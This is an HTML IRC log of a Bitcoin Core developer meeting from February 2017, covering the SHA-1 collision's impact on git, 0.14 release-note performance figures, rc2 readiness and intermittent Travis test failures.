@@ -1,0 +1,331 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+<title>#bitcoin-core-dev log</title>
+<style type="text/css">
+/* For the .log.html */
+pre { /*line-height: 125%;*/
+      white-space: pre-wrap; }
+body { background: #f0f0f0; }
+
+body .tm  { color: #007020 }                      /* time */
+body .nk  { color: #062873; font-weight: bold }   /* nick, regular */
+body .nka { color: #007020; font-weight: bold }  /* action nick */
+body .ac  { color: #00A000 }                      /* action line */
+body .hi  { color: #4070a0 }                 /* hilights */
+/* Things to make particular MeetBot commands stick out */
+body .topic     { color: #007020; font-weight: bold }
+body .topicline { color: #000080; font-weight: bold }
+body .cmd       { color: #007020; font-weight: bold }
+body .cmdline  { font-weight: bold }
+
+</style>
+</head>
+
+<body>
+<pre><a name="l-1"></a><span class="tm">19:00:31</span><span class="nk"> &lt;wumpus&gt;</span> <span class="cmd">#startmeeting</span><span class="cmdline"></span>
+<a name="l-2"></a><span class="tm">19:00:31</span><span class="nk"> &lt;lightningbot&gt;</span> Meeting started Thu Feb 23 19:00:31 2017 UTC.  The chair is wumpus. Information about MeetBot at http://wiki.debian.org/MeetBot.
+<a name="l-3"></a><span class="tm">19:00:31</span><span class="nk"> &lt;lightningbot&gt;</span> Useful Commands: #action #agreed #help #info #idea #link #topic.
+<a name="l-4"></a><span class="tm">19:00:32</span><span class="nk"> &lt;wumpus&gt;</span> <span class="cmd">#meetingstart</span><span class="cmdline"></span>
+<a name="l-5"></a><span class="tm">19:01:08</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="cmd">#bitcoin-core-dev </span><span class="cmdline">Meeting: wumpus sipa gmaxwell jonasschnelli morcos luke-jr btcdrak sdaftuar jtimon cfields petertodd kanzure bluematt instagibbs phantomcircuit codeshark michagogo marcofalke paveljanik NicolasDorier</span>
+<a name="l-6"></a><span class="tm">19:01:13</span><span class="nk"> &lt;jonasschnelli&gt;</span> hi
+<a name="l-7"></a><span class="tm">19:01:25</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">cfields:</span> we could ask if dooglus is using a tablet/touch screen, or was using it at that time.
+<a name="l-8"></a><span class="tm">19:01:43</span><span class="nk"> &lt;cfields&gt;</span> <span class="hi">wumpus:</span> oh, haha, i didn't notice it was the same reporter
+<a name="l-9"></a><span class="tm">19:01:53</span><span class="nk"> &lt;kanzure&gt;</span> hi.
+<a name="l-10"></a><span class="tm">19:02:14</span><span class="nk"> &lt;sipa&gt;</span> present
+<a name="l-11"></a><span class="tm">19:02:15</span><span class="nk"> &lt;petertodd&gt;</span> hi
+<a name="l-12"></a><span class="tm">19:02:26</span><span class="nk"> &lt;jonasschnelli&gt;</span> <span class="hi">wumpus:</span> did you reproduce 9814 with the same setup? Ubuntu and Qt 5.3?
+<a name="l-13"></a><span class="tm">19:02:28</span><span class="nk"> &lt;cfields&gt;</span> oh, nm
+<a name="l-14"></a><span class="tm">19:02:46</span><span class="nk"> &lt;petertodd&gt;</span> so quick note re: git and SHA1 collisions: https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2017-February/013600.html
+<a name="l-15"></a><span class="tm">19:02:54</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">jonasschnelli:</span> no, I did not reproduce it
+<a name="l-16"></a><span class="tm">19:02:58</span><span class="nk"> &lt;sipa&gt;</span> <span class="hi">petertodd:</span> i wanted to bring that up
+<a name="l-17"></a><span class="tm">19:03:04</span><span class="nk"> &lt;wumpus&gt;</span> <span class="topic">#topic </span><span class="topicline">git and sha collisions</span>
+<a name="l-18"></a><span class="tm">19:03:29</span><span class="nk"> &lt;petertodd&gt;</span> so while many people will say git isn't vulnerable if you trust a git repo's maintainers, that is *not* true as a pull-req could add a colliding file
+<a name="l-19"></a><span class="tm">19:03:38</span><span class="nk"> &lt;luke-jr&gt;</span> sounds like MD5 breakage
+<a name="l-20"></a><span class="tm">19:03:38</span><span class="nk"> &lt;achow101&gt;</span> does git and github only support sha1?
+<a name="l-21"></a><span class="tm">19:03:42</span><span class="nk"> &lt;sipa&gt;</span> <span class="hi">achow101:</span> yes
+<a name="l-22"></a><span class="tm">19:03:50</span><span class="nk"> &lt;sipa&gt;</span> i only read about this new sha1 attack an hour ago... how hard is it to create a collision?
+<a name="l-23"></a><span class="tm">19:04:01</span><span class="nk"> &lt;petertodd&gt;</span> probably only relevant with binary files, but we don't know 100% yet because details of the attack haven't been published
+<a name="l-24"></a><span class="tm">19:04:03</span><span class="nk"> &lt;luke-jr&gt;</span> <span class="hi">achow101:</span> IIRC, git is designed in such a way that changing SHA1 is very difficult
+<a name="l-25"></a><span class="tm">19:04:04</span><span class="nk"> &lt;achow101&gt;</span> <span class="hi">sipa:</span> still very hard
+<a name="l-26"></a><span class="tm">19:04:20</span><span class="nk"> &lt;sipa&gt;</span> i see
+<a name="l-27"></a><span class="tm">19:04:20</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">sipa:</span> it's not a new attack its the one published from a coule years ago with about 2^64 complexity.  There were some estimates of a cost on EC2 of about $110k.
+<a name="l-28"></a><span class="tm">19:04:26</span><span class="nk"> &lt;wumpus&gt;</span> 110 GPU-years or so
+<a name="l-29"></a><span class="tm">19:04:31</span><span class="nk"> &lt;gmaxwell&gt;</span> It's just actually been executed now.
+<a name="l-30"></a><span class="tm">19:04:48</span><span class="nk"> &lt;sipa&gt;</span> <span class="hi">gmaxwell:</span> no, it seems new research was done that simplifies it further
+<a name="l-31"></a><span class="tm">19:04:50</span><span class="nk"> &lt;gmaxwell&gt;</span> (at least thats my understanding)
+<a name="l-32"></a><span class="tm">19:04:53</span><span class="nk"> &lt;petertodd&gt;</span> <span class="hi">gmaxwell:</span> is it confirmed that google's efforts don't include any advances on what was already known to be possible?
+<a name="l-33"></a><span class="tm">19:04:55</span><span class="nk"> &lt;gmaxwell&gt;</span> oh. I missed that, okay!
+<a name="l-34"></a><span class="tm">19:05:26</span><span class="nk"> &lt;luke-jr&gt;</span> is the git project taking any action now?
+<a name="l-35"></a><span class="tm">19:05:36</span><span class="nk"> &lt;BlueMatt&gt;</span> <span class="hi">luke-jr:</span> doesnt look like it
+<a name="l-36"></a><span class="tm">19:05:37</span><span class="nk"> &lt;wumpus&gt;</span> Google and CWI, the dutch center for mathetmatics and informatics
+<a name="l-37"></a><span class="tm">19:05:44</span><span class="nk"> &lt;BlueMatt&gt;</span> <span class="hi">luke-jr:</span> (at least no movement as of this morning)
+<a name="l-38"></a><span class="tm">19:05:52</span><span class="nk"> &lt;gmaxwell&gt;</span> I think they already said they wouldn't before?
+<a name="l-39"></a><span class="tm">19:06:09</span><span class="nk"> &lt;sipa&gt;</span> i wonder how hard it is to create an overlay... that goes back in history, computes a sha256 for every tree and commit, and then include gpg signatures on those?
+<a name="l-40"></a><span class="tm">19:06:23</span><span class="nk"> &lt;jonasschnelli&gt;</span> <span class="hi">sipa:</span> great idea
+<a name="l-41"></a><span class="tm">19:06:38</span><span class="nk"> &lt;petertodd&gt;</span> <span class="hi">sipa:</span> I have code for something very similar to that in OpenTimestamps actually, and people have written tools to do that as well other than opentimestamps
+<a name="l-42"></a><span class="tm">19:06:40</span><span class="nk"> &lt;btcdrak&gt;</span> The exploit has a fancy name as usual http://shattered.io/
+<a name="l-43"></a><span class="tm">19:06:44</span><span class="nk"> &lt;gmaxwell&gt;</span> http://marc.info/?l=git&amp;m=115678778717621&amp;w=2 "The only _dangerous_ kind of collision is the inadvertent kind,
+<a name="l-44"></a><span class="tm">19:06:47</span><span class="nk"> &lt;gmaxwell&gt;</span> but that's obviously also the very very unlikely kind."
+<a name="l-45"></a><span class="tm">19:06:52</span><span class="nk"> &lt;BlueMatt&gt;</span> <span class="hi">sipa:</span> I was looking this morning to see if you could reasonably patch git to do so directly, looks hard.....still, we can update our dev scripts to do a sha256sum of all committed files and sign that as well
+<a name="l-46"></a><span class="tm">19:07:47</span><span class="nk"> &lt;sipa&gt;</span> <span class="hi">BlueMatt:</span> signing just the trees i guess is an easy first step
+<a name="l-47"></a><span class="tm">19:07:47</span><span class="nk"> &lt;btcdrak&gt;</span> according to the site "How is GIT affected?
+<a name="l-48"></a><span class="tm">19:07:47</span><span class="nk"> &lt;btcdrak&gt;</span> GIT strongly relies on SHA-1 for the identification and integrity checking of all file objects and commits. It is essentially possible to create two GIT repositories with the same head commit hash and different contents, say a benign source code and a backdoored one. An attacker could potentially selectively serve either repository to targeted users. This
+<a name="l-49"></a><span class="tm">19:07:47</span><span class="nk"> &lt;btcdrak&gt;</span> will require attackers to compute their own collision."
+<a name="l-50"></a><span class="tm">19:07:47</span><span class="nk"> &lt;wumpus&gt;</span> but the tree is a sha1 hash too, isn't it?
+<a name="l-51"></a><span class="tm">19:07:47</span><span class="nk"> &lt;BlueMatt&gt;</span> <span class="hi">gmaxwell:</span> yup, great, linus and associated kernel folks continue to willfully ignore that security matters even the slightest bit
+<a name="l-52"></a><span class="tm">19:07:47</span><span class="nk"> &lt;gmaxwell&gt;</span> what does the signed commit stuff sign? if it signs the commit message, then we can include a sha256 in it and have the verify check that too.
+<a name="l-53"></a><span class="tm">19:07:47</span><span class="nk"> &lt;BlueMatt&gt;</span> <span class="hi">wumpus:</span> yes, it would have to be a separate thing
+<a name="l-54"></a><span class="tm">19:07:47</span><span class="nk"> &lt;wumpus&gt;</span> if you don't trust SHA1 anymore, that rabbit hole goes deep
+<a name="l-55"></a><span class="tm">19:07:47 </span><span class="nka">* luke-jr</span> <span class="ac">votes banning binary files in any case :p</span>
+<a name="l-56"></a><span class="tm">19:07:53</span><span class="nk"> &lt;sdaftuar&gt;</span> is it worth periodically running https://github.com/cr-marcstevens/sha1collisiondetection on commits in our repo?
+<a name="l-57"></a><span class="tm">19:07:54</span><span class="nk"> &lt;BlueMatt&gt;</span> <span class="hi">wumpus:</span> eg the merge scripts could include a hash of sha256sum * in the commit message
+<a name="l-58"></a><span class="tm">19:08:07</span><span class="nk"> &lt;petertodd&gt;</span> <span class="hi">gmaxwell:</span> the signed commit stuff signs a SHA1 hash, but it's easy to extend that with a gnupg wrapper; I could take the code from OpenTimestamps and do that
+<a name="l-59"></a><span class="tm">19:08:08</span><span class="nk"> &lt;BlueMatt&gt;</span> <span class="hi">sdaftuar:</span> I have a patch for git to use that as the hash function
+<a name="l-60"></a><span class="tm">19:08:16</span><span class="nk"> &lt;BlueMatt&gt;</span> and abort() if it detects a potentially-bad hash
+<a name="l-61"></a><span class="tm">19:08:22</span><span class="nk"> &lt;sipa&gt;</span> <span class="hi">BlueMatt:</span> sounds like a great idea
+<a name="l-62"></a><span class="tm">19:08:39</span><span class="nk"> &lt;kanzure&gt;</span> off-topic, but i wonder what git could change to make upgrading backwards-compatible in the future. for now i think it must be an incompatible upgrade to switch to another hash function?
+<a name="l-63"></a><span class="tm">19:08:39</span><span class="nk"> &lt;sipa&gt;</span> (including the sha256sum * in the merge commit message)
+<a name="l-64"></a><span class="tm">19:08:42</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">BlueMatt:</span> if bad hashes are rare, that makes sense
+<a name="l-65"></a><span class="tm">19:08:47</span><span class="nk"> &lt;petertodd&gt;</span> <span class="hi">gmaxwell:</span> the one thing OpenTimestamps doesn't already do is recalculate hashes of *prior* commits with SHA256, but that'd be easy to add
+<a name="l-66"></a><span class="tm">19:09:12</span><span class="nk"> &lt;kanzure&gt;</span> i would also like the gh-meta repository maintainer to consider timestamping with opentimestamps at some point, i dunno who he is and i haven't pestered him yet
+<a name="l-67"></a><span class="tm">19:09:25</span><span class="nk"> &lt;BlueMatt&gt;</span> <span class="hi">wumpus:</span> the authors of that hash code claim 2**-90
+<a name="l-68"></a><span class="tm">19:09:32</span><span class="nk"> &lt;kanzure&gt;</span> er, the bitcoin-gh-meta repository person
+<a name="l-69"></a><span class="tm">19:09:32</span><span class="nk"> &lt;BlueMatt&gt;</span> (for random hits)
+<a name="l-70"></a><span class="tm">19:09:32</span><span class="nk"> &lt;luke-jr&gt;</span> detecting it after the fact seems like it would still be irrepairable?
+<a name="l-71"></a><span class="tm">19:10:03</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">kanzure:</span> iwilcox on IRC
+<a name="l-72"></a><span class="tm">19:10:10</span><span class="nk"> &lt;petertodd&gt;</span> <span class="hi">kanzure:</span> git could easily have git commits simultaneously generate and sign two different hash functions; quite feasible to implement. I'll bet you I could pull that off in a week or two of work.
+<a name="l-73"></a><span class="tm">19:10:12</span><span class="nk"> &lt;kanzure&gt;</span> oh good, he is easily pesterable.
+<a name="l-74"></a><span class="tm">19:10:46</span><span class="nk"> &lt;kanzure&gt;</span> <span class="hi">petertodd:</span> yea but needs to be backwards compatible; and the bloat from two commits does not sound ideal. are they considering that btw?
+<a name="l-75"></a><span class="tm">19:10:53</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">BlueMatt:</span> if the chance of an inadvertent match is that low, in that case, abort() /reject is a great solution
+<a name="l-76"></a><span class="tm">19:11:25</span><span class="nk"> &lt;luke-jr&gt;</span> <span class="hi">kanzure:</span> I'd guess you simply list the parent commit hashes twice?
+<a name="l-77"></a><span class="tm">19:11:27</span><span class="nk"> &lt;petertodd&gt;</span> <span class="hi">kanzure:</span> no bloat involved - the data can be shared across both commits
+<a name="l-78"></a><span class="tm">19:12:03</span><span class="nk"> &lt;kanzure&gt;</span> ah okay. well, i hadn't heard that proposal today, someone should check if git upstream is thinking about that.
+<a name="l-79"></a><span class="tm">19:12:09</span><span class="nk"> &lt;gmaxwell&gt;</span> probably said enough on this for now.
+<a name="l-80"></a><span class="tm">19:12:15</span><span class="nk"> &lt;btcdrak&gt;</span> There's a conversation on the git mailing list https://public-inbox.org/git/xmqqk28g92h7.fsf@gitster.mtv.corp.google.com/T/#t
+<a name="l-81"></a><span class="tm">19:12:33</span><span class="nk"> &lt;petertodd&gt;</span> <span class="hi">gmaxwell:</span> ack
+<a name="l-82"></a><span class="tm">19:12:42</span><span class="nk"> &lt;wumpus&gt;</span> yes, agreed
+<a name="l-83"></a><span class="tm">19:12:58</span><span class="nk"> &lt;petertodd&gt;</span> next topic
+<a name="l-84"></a><span class="tm">19:13:06</span><span class="nk"> &lt;wumpus&gt;</span> <span class="topic">#topic </span><span class="topicline">help cfields with adding performance-related release notes</span>
+<a name="l-85"></a><span class="tm">19:13:08</span><span class="nk"> &lt;wumpus&gt;</span> https://github.com/bitcoin/bitcoin/pull/9787
+<a name="l-86"></a><span class="tm">19:13:13</span><span class="nk"> &lt;cfields&gt;</span> quick call for 0.14 perf improvements on 9897
+<a name="l-87"></a><span class="tm">19:13:18</span><span class="nk"> &lt;cfields&gt;</span> heh, thanks :)
+<a name="l-88"></a><span class="tm">19:13:52</span><span class="nk"> &lt;cfields&gt;</span> err... #9787
+<a name="l-89"></a><span class="tm">19:13:54</span><span class="nk"> &lt;gribble&gt;</span> https://github.com/bitcoin/bitcoin/issues/9787 | release: add a few performance-related notes by theuni · Pull Request #9787 · bitcoin/bitcoin · GitHub
+<a name="l-90"></a><span class="tm">19:13:57</span><span class="nk"> &lt;jtimon&gt;</span> <span class="hi">kanzure:</span> yeah I assume changing the hash function would be a hardfork for old repositories :p
+<a name="l-91"></a><span class="tm">19:14:16</span><span class="nk"> &lt;cfields&gt;</span> if anyone added a big user-facing performance improvement for 0.14, please speak up
+<a name="l-92"></a><span class="tm">19:14:46</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">jtimon:</span> please don't use bitcoin terms for other things especially non-consensus systems. The classic words "backwards incompatible" are fine. :P
+<a name="l-93"></a><span class="tm">19:15:03</span><span class="nk"> &lt;jtimon&gt;</span> <span class="hi">gmaxwell:</span> yep, sorry, was a bad joke
+<a name="l-94"></a><span class="tm">19:15:29</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">jtimon:</span> dependso n how close the new hash function is to SHA-1. If it gets the same output 1-2**90 of the time, most repositories won't be affected
+<a name="l-95"></a><span class="tm">19:15:30</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">cfields:</span> no measurements in the notes?
+<a name="l-96"></a><span class="tm">19:16:37</span><span class="nk"> &lt;cfields&gt;</span> <span class="hi">gmaxwell:</span> see the pr description. I've taken some measurements on the net stuff, but they're highly localized.
+<a name="l-97"></a><span class="tm">19:17:20</span><span class="nk"> &lt;gmaxwell&gt;</span> wish I realized no one was going to benchmark I could have started one last night. :P
+<a name="l-98"></a><span class="tm">19:17:40</span><span class="nk"> &lt;jeremyrubin&gt;</span> I would also note that the cuckoocache means nodes wanting to use more cores but had performance degrade should try more cores again
+<a name="l-99"></a><span class="tm">19:18:13</span><span class="nk"> &lt;sipa&gt;</span> right, cuckoocache has no effect at low parallellism, i think?
+<a name="l-100"></a><span class="tm">19:18:50</span><span class="nk"> &lt;morcos&gt;</span> <span class="hi">sipa:</span> no it's smarter about keepign the right signatures in the cache due to the generations and lazy eviction
+<a name="l-101"></a><span class="tm">19:18:54</span><span class="nk"> &lt;cfields&gt;</span> <span class="hi">gmaxwell:</span> i've done lots of benchmarking. But as I said, I'm not sure how to translate that into helpful figures
+<a name="l-102"></a><span class="tm">19:19:21</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">sipa:</span> e.g. it will make reorgs much faster!
+<a name="l-103"></a><span class="tm">19:19:35</span><span class="nk"> &lt;cfields&gt;</span> well the alternative is to use a reference system/environment for each improvement
+<a name="l-104"></a><span class="tm">19:19:46</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">cfields:</span> users don't care about each improvement.
+<a name="l-105"></a><span class="tm">19:20:15</span><span class="nk"> &lt;wumpus&gt;</span> it also doesn't need to be super precise
+<a name="l-106"></a><span class="tm">19:20:25</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">cfields:</span> "Sync with least release takes N hours now, sync with new release takes Y now." would be nice.
+<a name="l-107"></a><span class="tm">19:20:53</span><span class="nk"> &lt;jonasschnelli&gt;</span> or syncs are rougle XYZ% faster...
+<a name="l-108"></a><span class="tm">19:21:13</span><span class="nk"> &lt;jonasschnelli&gt;</span> use the ~ and nobody will blame you afterwards. :)
+<a name="l-109"></a><span class="tm">19:21:30</span><span class="nk"> &lt;jeremyrubin&gt;</span> use two ~~ to be extra aproximate
+<a name="l-110"></a><span class="tm">19:21:43</span><span class="nk"> &lt;wumpus&gt;</span> it's marketing not science :p hehe
+<a name="l-111"></a><span class="tm">19:21:48</span><span class="nk"> &lt;gmaxwell&gt;</span> but ~~ will just give you the same number you put in!
+<a name="l-112"></a><span class="tm">19:22:44</span><span class="nk"> &lt;jeremyrubin&gt;</span> The is-approximately operator is non-involutive ;)
+<a name="l-113"></a><span class="tm">19:22:51</span><span class="nk"> &lt;gmaxwell&gt;</span> Well people just have no general idea of the impact.  Marketing would be saying that it's 2x faster rathern the 3x faster because 2x is more plausable. :P
+<a name="l-114"></a><span class="tm">19:22:51</span><span class="nk"> &lt;jeremyrubin&gt;</span> anyways
+<a name="l-115"></a><span class="tm">19:23:21</span><span class="nk"> &lt;cfields&gt;</span> ok, i'll add a vague 0.13 vs 0.14 sync time. The 0.13 will take time though, I haven't had the patience to finish one yet
+<a name="l-116"></a><span class="tm">19:23:28</span><span class="nk"> &lt;jeremyrubin&gt;</span> Could be cool to spin up a few different EC2 instances to compare...
+<a name="l-117"></a><span class="tm">19:23:39</span><span class="nk"> &lt;wumpus&gt;</span> EC is not a good comparison environment
+<a name="l-118"></a><span class="tm">19:23:45</span><span class="nk"> &lt;wumpus&gt;</span> sloooow i/o
+<a name="l-119"></a><span class="tm">19:23:56</span><span class="nk"> &lt;sipa&gt;</span> i'm syncing on a RPi3
+<a name="l-120"></a><span class="tm">19:24:02</span><span class="nk"> &lt;sipa&gt;</span> sloooow
+<a name="l-121"></a><span class="tm">19:24:09</span><span class="nk"> &lt;wumpus&gt;</span> what storage?
+<a name="l-122"></a><span class="tm">19:24:13</span><span class="nk"> &lt;luke-jr&gt;</span> lol
+<a name="l-123"></a><span class="tm">19:24:27</span><span class="nk"> &lt;sipa&gt;</span> microsd card
+<a name="l-124"></a><span class="tm">19:24:27</span><span class="nk"> &lt;jonasschnelli&gt;</span> uh
+<a name="l-125"></a><span class="tm">19:24:27</span><span class="nk"> &lt;cfields&gt;</span> i used EC for my sync benching because i figured it represented a very typical use-case
+<a name="l-126"></a><span class="tm">19:24:33</span><span class="nk"> &lt;wumpus&gt;</span> that's the cause of the slowness, likely
+<a name="l-127"></a><span class="tm">19:24:34</span><span class="nk"> &lt;jeremyrubin&gt;</span> Actually I like that. We should publish the worst system that can sync :p
+<a name="l-128"></a><span class="tm">19:24:47</span><span class="nk"> &lt;sipa&gt;</span> <span class="hi">wumpus:</span> absolutely
+<a name="l-129"></a><span class="tm">19:24:50 </span><span class="nka">* luke-jr</span> <span class="ac">ponders trying on his USB Armory again</span>
+<a name="l-130"></a><span class="tm">19:25:01</span><span class="nk"> &lt;jtimon&gt;</span> other topics?
+<a name="l-131"></a><span class="tm">19:25:07</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">sipa:</span> if it's really CPU bound, don't forget to use the experimental ARM assembly secp256k1 :)
+<a name="l-132"></a><span class="tm">19:25:23</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">sipa:</span> right, as I expected
+<a name="l-133"></a><span class="tm">19:25:31</span><span class="nk"> &lt;cfields&gt;</span> For reference, 0.14 sync took roughly 3 hours on ec2 w/ 4 cpu cores
+<a name="l-134"></a><span class="tm">19:25:42</span><span class="nk"> &lt;sipa&gt;</span> <span class="hi">wumpus:</span> i enabled it, but it's not nearly CPU bound
+<a name="l-135"></a><span class="tm">19:25:51</span><span class="nk"> &lt;achow101&gt;</span> <span class="hi">topic:</span> rc2 status?
+<a name="l-136"></a><span class="tm">19:26:10</span><span class="nk"> &lt;wumpus&gt;</span> <span class="topic">#topic </span><span class="topicline">rc2 status</span>
+<a name="l-137"></a><span class="tm">19:26:24</span><span class="nk"> &lt;wumpus&gt;</span> I think it should be ready to tag
+<a name="l-138"></a><span class="tm">19:26:57</span><span class="nk"> &lt;wumpus&gt;</span> well, need to update the translations and release notes to include changes since rc1, but I don't think there's anything that still needs to be solved
+<a name="l-139"></a><span class="tm">19:27:04</span><span class="nk"> &lt;achow101&gt;</span> there are still open prs in the milestone though
+<a name="l-140"></a><span class="tm">19:27:22</span><span class="nk"> &lt;achow101&gt;</span> (well 1 that actually does something)
+<a name="l-141"></a><span class="tm">19:27:30</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">achow101:</span> one is release notes - that can go in any time before final
+<a name="l-142"></a><span class="tm">19:27:58</span><span class="nk"> &lt;wumpus&gt;</span> <span class="cmd">#9829 </span><span class="cmdline">would be nice to get in, but it's breaking travis</span>
+<a name="l-143"></a><span class="tm">19:28:00</span><span class="nk"> &lt;gribble&gt;</span> https://github.com/bitcoin/bitcoin/issues/9829 | Fix importmulti returning rescan errors for wrong keys by ryanofsky · Pull Request #9829 · bitcoin/bitcoin · GitHub
+<a name="l-144"></a><span class="tm">19:28:49</span><span class="nk"> &lt;jtimon&gt;</span> <span class="hi">ryanofsky:</span> ping
+<a name="l-145"></a><span class="tm">19:29:20</span><span class="nk"> &lt;ryanofsky&gt;</span> should i do something? bump travis?
+<a name="l-146"></a><span class="tm">19:29:23</span><span class="nk"> &lt;wumpus&gt;</span> (I've already tried to retrigger it so it's not one of today's intermittent problems)
+<a name="l-147"></a><span class="tm">19:29:56</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">ryanofsky:</span> I don't think that helps
+<a name="l-148"></a><span class="tm">19:30:16</span><span class="nk"> &lt;gmaxwell&gt;</span> Does it pass locally?
+<a name="l-149"></a><span class="tm">19:30:39</span><span class="nk"> &lt;ryanofsky&gt;</span> yeah, the errors are the same "__pthread_mutex_lock: Assertion `mutex-&gt;__data.__owner == 0' failed" things i've seen on other prs
+<a name="l-150"></a><span class="tm">19:31:07</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">ryanofsky:</span> oh, https://github.com/bitcoin/bitcoin/issues/9825
+<a name="l-151"></a><span class="tm">19:31:17</span><span class="nk"> &lt;ryanofsky&gt;</span> i had to bump one of my prs last week 5-6 times to make travis pass
+<a name="l-152"></a><span class="tm">19:31:22</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">ryanofsky:</span> okay, will respin
+<a name="l-153"></a><span class="tm">19:32:34</span><span class="nk"> &lt;bitcoin-git&gt;</span> [13bitcoin] 15laanwj pushed 1 new commit to 060.14: 02https://github.com/bitcoin/bitcoin/commit/847e3753a6d6a6ab4dd081e2945cb200faf730d4
+<a name="l-154"></a><span class="tm">19:32:34</span><span class="nk"> &lt;bitcoin-git&gt;</span> 13bitcoin/060.14 14847e375 15Wladimir J. van der Laan: qt: pre-rc2 translations update
+<a name="l-155"></a><span class="tm">19:33:00</span><span class="nk"> &lt;morcos&gt;</span> Can we figure out when these travis errors started?  Do we get them on personal travis instances?  Can we bisect?  Seems likely somethign changed on our end right?
+<a name="l-156"></a><span class="tm">19:33:12</span><span class="nk"> &lt;wumpus&gt;</span> <span class="topic">#topic </span><span class="topicline">travis issues</span>
+<a name="l-157"></a><span class="tm">19:33:16</span><span class="nk"> &lt;gmaxwell&gt;</span> do we have any idea whats causing that? I assume no one has hit it locally?  I left test bitcoin running in a loop when I first saw it on the off chance it was an ASLR mediated thing that was only hitting travis sometimes.
+<a name="l-158"></a><span class="tm">19:33:32</span><span class="nk"> &lt;gmaxwell&gt;</span> (no results, of course)
+<a name="l-159"></a><span class="tm">19:33:37</span><span class="nk"> &lt;jonasschnelli&gt;</span> We recently added a missing ecc_start to bitcoin-tx... but I can't see any relation
+<a name="l-160"></a><span class="tm">19:33:50</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">jonasschnelli:</span> I don't even see why you mention that?
+<a name="l-161"></a><span class="tm">19:33:51</span><span class="nk"> &lt;wumpus&gt;</span> I tried to reproduce #9825 for hours on a trusty vm, with five threads for a few hours... but no dice
+<a name="l-162"></a><span class="tm">19:33:52</span><span class="nk"> &lt;gribble&gt;</span> https://github.com/bitcoin/bitcoin/issues/9825 | Intermittent FAIL: test/test_bitcoin in Travis · Issue #9825 · bitcoin/bitcoin · GitHub
+<a name="l-163"></a><span class="tm">19:34:01</span><span class="nk"> &lt;wumpus&gt;</span> to bitcoin-tx? yea, that won't make a difference
+<a name="l-164"></a><span class="tm">19:34:26</span><span class="nk"> &lt;jonasschnelli&gt;</span> <span class="hi">gmaxwell:</span> becuase of that "test_bitcoin: key.cpp:300: void ECC_Start(): Assertion `secp256k1_context_sign == __null' failed."?
+<a name="l-165"></a><span class="tm">19:34:31</span><span class="nk"> &lt;gmaxwell&gt;</span> It looks like test_bitcoin fails before it even really starts. So global constructors or somehting in the C libraries.
+<a name="l-166"></a><span class="tm">19:34:43</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">jonasschnelli:</span> that's only a effect of the failure
+<a name="l-167"></a><span class="tm">19:34:44</span><span class="nk"> &lt;jeremyrubin&gt;</span> I noticed that one of the builds seems to have some additional bounds checks enabled -- might be nice to enable those across travis tests? Hopefully no code relies on bounds checks/not
+<a name="l-168"></a><span class="tm">19:34:49</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">jonasschnelli:</span> *everything* after the initial failure fails
+<a name="l-169"></a><span class="tm">19:34:55</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">jonasschnelli:</span> secp256k1 is innocent
+<a name="l-170"></a><span class="tm">19:35:00</span><span class="nk"> &lt;jonasschnelli&gt;</span> ah.. I see.
+<a name="l-171"></a><span class="tm">19:35:23</span><span class="nk"> &lt;jtimon&gt;</span> perhaps we're forgetting some EEC_stop() somewhere?
+<a name="l-172"></a><span class="tm">19:35:32</span><span class="nk"> &lt;gmaxwell&gt;</span> no. geesh
+<a name="l-173"></a><span class="tm">19:35:47</span><span class="nk"> &lt;wumpus&gt;</span> no, I'm fairly sure it doesn't have to do with secp256k1
+<a name="l-174"></a><span class="tm">19:35:57</span><span class="nk"> &lt;wumpus&gt;</span> it's something done with mutexes before mutexes are initialized
+<a name="l-175"></a><span class="tm">19:36:20</span><span class="nk"> &lt;jtimon&gt;</span> ok, I really have no idea what's happening
+<a name="l-176"></a><span class="tm">19:36:24</span><span class="nk"> &lt;wumpus&gt;</span> looks like some kind of race condition, but I have no idea where or what
+<a name="l-177"></a><span class="tm">19:36:47</span><span class="nk"> &lt;wumpus&gt;</span> if it happens it *always* happens in test_bitcoin, never in bitcoind, bitcoin-cli, bitcoin-tx
+<a name="l-178"></a><span class="tm">19:37:05</span><span class="nk"> &lt;gmaxwell&gt;</span> I wonder if we could make our travis build script rerun any failing case under gdb so it would print a backtrace?
+<a name="l-179"></a><span class="tm">19:37:27</span><span class="nk"> &lt;BlueMatt&gt;</span> <span class="hi">gmaxwell:</span> probably using coredumps?
+<a name="l-180"></a><span class="tm">19:37:40</span><span class="nk"> &lt;wumpus&gt;</span> if you rerun it it will probably pass
+<a name="l-181"></a><span class="tm">19:37:42</span><span class="nk"> &lt;jtimon&gt;</span> perhaps some of the globals initialized in test_bitcoin.cpp ?
+<a name="l-182"></a><span class="tm">19:37:43</span><span class="nk"> &lt;gmaxwell&gt;</span> or that.
+<a name="l-183"></a><span class="tm">19:37:48</span><span class="nk"> &lt;jeremyrubin&gt;</span> in theory boost test runner can start gdb
+<a name="l-184"></a><span class="tm">19:37:53</span><span class="nk"> &lt;jtimon&gt;</span> just thinking out loud again...
